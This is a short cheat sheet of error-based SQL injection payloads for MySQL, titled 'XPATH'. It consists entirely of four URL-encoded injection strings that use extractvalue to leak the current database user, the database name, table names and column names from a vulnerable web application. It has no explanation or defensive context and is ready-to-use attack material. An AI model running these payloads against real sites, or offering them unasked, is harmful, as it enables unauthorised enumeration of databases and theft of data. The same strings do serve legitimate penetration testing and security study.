# XPATH - Error Based SQL Injection Payloads

## Current user
```
-1'+and+extractvalue(0x3b,concat(0x3b,current_user()))--+- 
```

## Database name
```
-1'+and+extractvalue(0x3b,concat(0x3b,database()))--+-
```

## Table names
```
-1'+and+extractvalue(0x3b,concat(0x3b,(select+group_concat(0x3b,table_name)+from+information_schema.tables+where+table_schema=database())))--+-
```

## Column names
```
-1'+and+extractvalue(0x3b,concat(0x3b,(select+group_concat(0x3b,column_name)+from+information_schema.columns+where+table_schema=database()+limit+0,1)))--+-
```
